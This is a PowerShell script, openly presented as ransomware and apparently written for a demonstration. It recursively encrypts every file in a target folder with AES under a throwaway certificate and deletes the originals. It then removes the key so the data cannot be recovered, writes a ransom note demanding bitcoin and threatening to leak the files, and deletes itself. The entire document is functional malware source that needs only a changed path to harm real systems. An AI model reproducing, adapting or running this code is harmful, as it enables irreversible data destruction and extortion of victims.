<#

 ___      __      __  _____ _____________________                                              
 |||     /  \    /  \/  _  \\______   \_   _____/                                                
 |||     \   \/\/   /  /_\  \|       _/|    __)_                                                  
 |||_____ \        /    |    \    |   \|        \                                                 
 ||_____\\ \  /\  /\____|__  /____|_  /_______  /                                                   
 |_______\\ \/  \/         \/       \/        \/v1.x  
         \/ 

.Synopsis
   Lware a crypto ransomware writen in powershell 
.DESCRIPTION
   Lware a crypto ransomware writen in powershell for the Purpose of Customer Experience Center Demonstration 
.EXAMPLE
   Just launch badware.ps1
.INPUTS
   No Inputs 
.OUTPUTS
   None
.NOTES
    Version:        2.3
	Author:         Julien Mousqueton @JMousqueton 
	Creation Date:  2021-08-09
	Purpose/Change: Simplify the crypto 
.COMPONENT
    None
#>

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

# Directory Target
$TargetEncr = "C:\teste"

# Define the DN of the certificate 
$CertName = "DEMO CEC"

#Set Error & Warning Action 
$ErrorActionPreference = "Stop"
$WarningPreference = "SilentlyContinue"

#Script Version
#$Version = "1.0"

Write-Host ""
Write-Host " ___      __      __  _____ _____________________    " -ForegroundColor DarkRed                                          
Write-Host " |||     /  \    /  \/  _  \\______   \_   _____/    " -ForegroundColor DarkRed                                            
Write-Host " |||     \   \/\/   /  /_\  \|       _/|    __)_     " -ForegroundColor DarkRed                                             
Write-Host " |||_____ \        /    |    \    |   \|        \    " -ForegroundColor DarkRed                                             
Write-Host " ||_____\\ \  /\  /\____|__  /____|_  /_______  /    " -ForegroundColor DarkRed                                               
Write-Host " |_______\\ \/  \/         \/       \/        \/v1.x " -ForegroundColor DarkRed 
Write-Host "         \/ "


### MAIN ### 
Test-Path -Path $TargetEncr
$TargetEncr

if (Test-Path -Path $TargetEncr) {
	write-host "[+] Let the carnage begin !!!" -ForegroundColor Green
} 
else {
	write-host "[+] No data found ... exiting" -ForegroundColor Red 
	exit
}

Write-Host "[+] Prepating Directory" -ForegroundColor Green
$TempDir = "c:\$((Get-Date).ToString('yyyy-MM-dd-HHmm'))"
New-Item -ItemType Directory -Path "$TempDir" | Out-Null 

Write-Host "[+] Init Certificate ..." -ForegroundColor Green
# RSA 3072 bits RSA Key
#----------------------------------------------------------------------------------------------------------------------------------------
# Generate Certificate & Export it to the Temp folder
#----------------------------------------------------------------------------------------------------------------------------------------

$cert = New-SelfSignedCertificate -DnsName $CertName -CertStoreLocation "Cert:\CurrentUser\My" -KeyLength 2048 -HashAlgorithm "Sha384" -NotBefore ((Get-Date).AddDays(-1)) -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) -Type DocumentEncryptionCert -KeyUsage KeyEncipherment, DataEncipherment

Export-Certificate -Cert $cert -FilePath "$TempDir\cert.cer" | Out-Null

#----------------------------------------------------------------------------------------------------------------------------------------
# Base64 encoding the certificate 
#----------------------------------------------------------------------------------------------------------------------------------------
#$encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$TempDir\cert.cer"))

$CertPrint = get-childitem -Path "cert:\CurrentUser\my" | Where-Object { $_.subject -eq "CN=$CertName" } | Select-Object -expandproperty Thumbprint

if ($CertPrint -is [array]) 
{
    $CertPrint = $CertPrint[0]
}
$Cert = $(Get-ChildItem Cert:\CurrentUser\My\$CertPrint)

Write-Host "[+] Init Encryption ..." -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
# Encrypt files via Badware 
#----------------------------------------------------------------------------------------------------------------------------------------

Function Encrypt-File
{
    Param(
            [Parameter(mandatory=$true)][System.IO.FileInfo]$FileToEncrypt,
            [Parameter(mandatory=$true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert
          )
 
        
    $AesProvider                = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize        = 256
    $AesProvider.BlockSize      = 128
    $AesProvider.Mode           = [System.Security.Cryptography.CipherMode]::CBC
    $KeyFormatter               = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted       = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey             = $Null
    [Byte[]]$LenIV              = $Null
    [Int]$LKey                  = $KeyEncrypted.Length
    $LenKey                     = [System.BitConverter]::GetBytes($LKey)
    [Int]$LIV                   = $AesProvider.IV.Length
    $LenIV                      = [System.BitConverter]::GetBytes($LIV)

    $FileStreamWriter          
    
    Try { 
            $FileStreamWriter = New-Object System.IO.FileStream("$($env:temp+$FileToEncrypt.Name)", [System.IO.FileMode]::Create) 
        } Catch { 
            Write-Error "Unable to open output file for writing."; 
            Return 
        }

    $FileStreamWriter.Write($LenKey,         0, 4)
    $FileStreamWriter.Write($LenIV,          0, 4)
    $FileStreamWriter.Write($KeyEncrypted,   0, $LKey)
    $FileStreamWriter.Write($AesProvider.IV, 0, $LIV)

    $Transform                  = $AesProvider.CreateEncryptor()
    $CryptoStream               = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count                 = 0
    [Int]$Offset                = 0
    [Int]$BlockSizeBytes        = $AesProvider.BlockSize / 8
    [Byte[]]$Data               = New-Object Byte[] $BlockSizeBytes
    [Int]$BytesRead             = 0
    
    Try { 
        $FileStreamReader     = New-Object System.IO.FileStream("$($FileToEncrypt.FullName)", [System.IO.FileMode]::Open) 
    } Catch { 
        Write-Error "Unable to open input file for reading.";
        Return 
    }
    
    Do
    {
        $Count   = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
        $BytesRead += $BlockSizeBytes
    } While ($Count -gt 0)
     
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()
    
    copy-Item -Path $($env:temp+$FileToEncrypt.Name) -Destination "$($FileToEncrypt.FullName).badware" -Force
}



foreach ($i in $(Get-ChildItem $TargetEncr -recurse -exclude *.badware | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })){ 
   Encrypt-File $i $Cert 
   Write-Host "[!] $i is now encrypted" -ForegroundColor Red
   Remove-Item $i
}

Write-Host "[+] Badware Deployed Successfully..." -ForegroundColor Green

Write-Host "[+] Cleaning Encryption key ..." -ForeGroundColor Green
$(Get-ChildItem Cert:\CurrentUser\My\$CertPrint) | Remove-Item

Write-Host "[+] Intiating UI..." -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
# UI
#----------------------------------------------------------------------------------------------------------------------------------------
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 


Write-Host "[+] Creating Badware.txt on Desktop ..." -ForegroundColor Green
"We have encrypted your important files. For now, you cannot access these files. `nEncrypted files have been modified with an extension 'badware'. `nIt is possible to recover your files but you need to follow our instructions and pay us before the time runs out. `nIf you do not pay the ransom of 0.10 BTC these files will be leaked online. `nThe faster you contact us at mechant@evildomain with the proof of payment, the easier it will be for us to release your files. `nYour backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. `nTo decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. `nIf you do not pay the money your sensitive data will be leaked online. `n `n The Red Team ! " | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt

Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
Remove-Item -Path $MyInvocation.MyCommand.Source

Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green